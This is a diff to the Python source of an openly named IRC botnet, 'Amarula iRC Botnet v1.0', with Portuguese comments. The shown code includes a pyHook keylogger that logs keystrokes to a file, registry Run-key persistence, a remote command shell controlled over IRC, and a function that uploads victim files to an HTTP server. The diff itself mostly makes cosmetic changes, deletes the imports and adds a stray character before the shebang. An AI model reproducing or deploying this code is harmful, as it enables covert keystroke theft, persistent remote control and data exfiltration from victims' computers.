@@ -1,23 +1,17 @@
-#!/usr/bin/python
+z#!/usr/bin/python
 # -*-coding:utf-8-*-
+# coder: _carlosnericorreia_(badfly)
+# email: hackerama@protonmail.com
+# Amarula iRC Botnet v1.0 - Abacatch Version
 
 
-import glob                                       # Funcao listArq()
-import multiprocessing                            # Funcao Keylog()
-import os                                         # Funcoes deleteFile(), listArq(), upload(),
-import platform                                   # Variavel pcName
-import pyHook, pythoncom                          # Funcao keylog(), onKey(event)
-import random                                     # Variavel pcName
-import requests                                   # Funcao upload()
-import re                                         # Funcao getPublicIp()
-import socket                                     # Funcoes  conn(), ipLocal()
-import subprocess                                 # Funcao run()
-import sys                                        # Opcao matar
-from urllib import urlopen                        # Funcao getPublicIp()
-import urllib,urllib2                             # Funcao download()
-import threading                                  # Funcao onKey(event)
-import time                                       # Funcoes listArq(), shell(), main()
 
+#######################################################################################################################
+#                                                                                                                     #
+# -----------------------------------[+] A M A R U L A    I R C    B O T N E T [+] -----------------------------------#
+#                                                  Abacatch Version                                                   #
+#                                                                                                                     #
+#######################################################################################################################
 
 # --------------------------------------------------------------------------------------------------------------------#
 #                                              C O N F I G U R A C O E S                                              #
@@ -41,10 +35,11 @@ pcos = platform.platform()                                 # Nome do OS
 pcprocess = platform.processor()                           # Descricao do Processador
 fileup = ldir + '\capt-' + pcname + '.txt'                 # Auxiliar da funcao upload2(fileup)
 botNick = pcname + "-" + str(random.randint(1, 10000))     # Nick do bot no IRC
+
+
 # --------------------------------------------------------------------------------------------------------------------#
 #                                        F U N C O E S   O P E R A C I O N A I S                                      #
 # --------------------------------------------------------------------------------------------------------------------#
-
 
 def conn():
 # Inicia a conexao com o IRC
@@ -111,11 +106,9 @@ def keylog():
 
 	try:
 		os.mkdir(ldir)
-
 	except Exception as e:
 		print 'Excecao:', e
 		pass
-
 
 	file = open(ldir + '\capt-' + pcname + '.txt', 'a')
 	file.write('\n[+]'+('-'*64+'[+]\n'))
@@ -142,7 +135,7 @@ def listArq():
 		time.sleep(0.8)
 
 def onkey(event):
-# funcao qee sera chamada pelo 'hook_manager' toda vez que uma tecla for pressionada.
+# Funcao qee sera chamada pelo 'hook_manager' toda vez que uma tecla for pressionada.
 
     global head
     global data
@@ -186,7 +179,7 @@ def persis():
 
 	try:
 		conv = os.path.realpath(__file__).replace('.py', '.exe')
-		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Amarula /t REG_SZ /f /d '+conv, shell=True)
+		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Amarula /t REG_SZ /f /d '+"'"+conv+"'", shell=True)
 		EnviaMsg(ircChanne, "[+] Registro alterado com sucesso [+]")
 	except:
 		EnviaMsg(ircChanne, "[+] Nao foi possivel alterar o registro [+]")
@@ -232,8 +225,6 @@ def shell():
 			time.sleep(1)
 	except:
 		EnviaMsg(ircChanne, "[!] Ocorreu um erro na execucao do comando [!]")
-
-
 
 def upload():
 # Faz o upload de um arquivo do cliente para um servidor HTTP
